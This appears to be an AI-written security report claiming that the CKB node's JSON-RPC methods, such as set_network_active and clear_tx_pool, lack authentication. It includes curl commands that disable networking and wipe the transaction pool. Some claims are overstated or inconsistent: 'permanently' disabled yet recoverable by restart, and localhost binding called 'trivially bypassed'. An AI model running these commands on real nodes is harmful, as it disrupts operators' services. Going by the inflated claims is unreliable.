Based on my investigation of the CKB codebase, I have found a valid analog to the "Missing Proper Access Control" vulnerability class.

---

### Title
Unauthenticated RPC Callers Can Disable All P2P Networking via `set_network_active` - (File: rpc/src/module/net.rs)

### Summary
The CKB JSON-RPC server exposes state-mutating privileged operations — most critically `set_network_active` — with zero application-level authentication or caller authorization. Any process that can reach the RPC port (default `127.0.0.1:8114`) can call `set_network_active(false)` and permanently disable all P2P message processing for the running node, with no way for the node to distinguish the legitimate operator from a malicious local caller. This is the direct CKB analog of the Solidity `public` function with no access guard.

### Finding Description
The `NetRpc` trait exposes `set_network_active`, `clear_banned_addresses`, `set_ban`, and `add_node`/`remove_node` as plain RPC methods. The implementation in `rpc/src/module/net.rs` delegates directly to `NetworkController::set_active`, which atomically stores the new boolean into `network_state.active`:

```rust
// rpc/src/module/net.rs
#[rpc(name = "set_network_active")]
fn set_network_active(&self, state: bool) -> Result<()>;
```

```rust
// network/src/network.rs
pub fn set_active(&self, active: bool) {
    self.network_state.active.store(active, Ordering::Release);
}
```

The `ServiceBuilder` that assembles the RPC server adds every enabled module's methods with no authentication middleware:

```rust
// rpc/src/service_builder.rs
fn add_methods<I>(&mut self, rpc_methods: I) { ... }
```

There is no token, session cookie, IP allowlist check, or any other caller-identity gate at the application layer. The only protection is the network-level binding (`127.0.0.1:8114` by default), which is not an application-level access control and is trivially bypassed by any co-located process.

When `set_network_active(false)` is called, the `is_active()` guard causes every incoming P2P message to be silently discarded:

```rust
// network/src/network.rs
pub fn is_active(&self) -> bool {
    self.network_state.is_active()
}
```

The same absence of access control applies to `clear_tx_pool` and `remove_transaction` in `rpc/src/module/pool.rs`, and `clear_banned_addresses` / `set_ban` in `rpc/src/module/net.rs`.

### Impact Explanation
An attacker (any local process, or any remote host if the operator has exposed the RPC port) can:
1. Call `set_network_active(false)` → the node stops processing all P2P messages, halting block sync and transaction relay. The node is silently isolated from the network while appearing to run normally.
2. Call `clear_tx_pool` → all pending user transactions are dropped, causing silent loss of unconfirmed transactions and forcing users to resubmit.
3. Call `clear_banned_addresses` → all peer bans are erased, re-admitting previously banned malicious peers.
4. Call `remove_transaction(hash)` → targeted removal of specific pending transactions (e.g., a competitor's high-fee transaction).

The `set_network_active(false)` case is the most severe: the node cannot receive new blocks or transactions, cannot propagate mined blocks, and the operator may not notice immediately. Recovery requires a manual RPC call or node restart.

### Likelihood Explanation
- **Default configuration**: RPC binds to `127.0.0.1:8114`. Any process running under the same OS user (or any user on the same machine) can issue HTTP requests to this port — no credentials required.
- **Common misconfiguration**: Operators frequently expose the RPC port to a LAN or the internet (the README warns against this but does not enforce it). In that case, any network-reachable attacker can exploit this.
- **Zero preconditions**: No key, no signature, no session — a single HTTP POST suffices.
- **"RPC caller" is explicitly listed as an in-scope attacker profile** in the bounty scope.

### Recommendation
Add application-level authentication to the RPC server. Options include:
1. A shared secret / bearer token checked in a middleware layer before dispatching any method.
2. Per-module capability flags that require a token for state-mutating methods (`set_network_active`, `clear_tx_pool`, `set_ban`, `remove_transaction`, `clear_banned_addresses`).
3. At minimum, separate read-only methods from write/state-mutating methods and require explicit opt-in authentication for the latter group.

The `ServiceBuilder::add_methods` function in `rpc/src/service_builder.rs` is the correct insertion point for such middleware.

### Proof of Concept
With a default CKB node running:

```bash
# Disable all P2P networking — no credentials required
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}'
# Returns: {"jsonrpc":"2.0","result":null,"id":1}

# Verify: node no longer processes any P2P messages
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"local_node_info","params":[],"id":2}'
# "active": false — node is now isolated

# Clear the entire transaction pool — no credentials required
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":3}'
```

    fn add_methods<I>(&mut self, rpc_methods: I)
    where
        I: IntoIterator<Item = (String, RemoteProcedure<Option<Session>>)>,
    {
        let enable_deprecated_rpc = self.config.enable_deprecated_rpc;
        self.io_handler
            .extend_with(rpc_methods.into_iter().map(|(name, method)| {
                if let Some(striped_method_name) = name.strip_prefix(DEPRECATED_RPC_PREFIX) {
                    (
                        striped_method_name.to_owned(),
                        if enable_deprecated_rpc {
                            method
                        } else {
                            RemoteProcedure::Method(Arc::new(|_param, _meta| async {
                                Err(RPCError::rpc_method_is_deprecated())
                            }))
                        },
                    )
                } else {
                    (name, method)
                }
            }));
    }
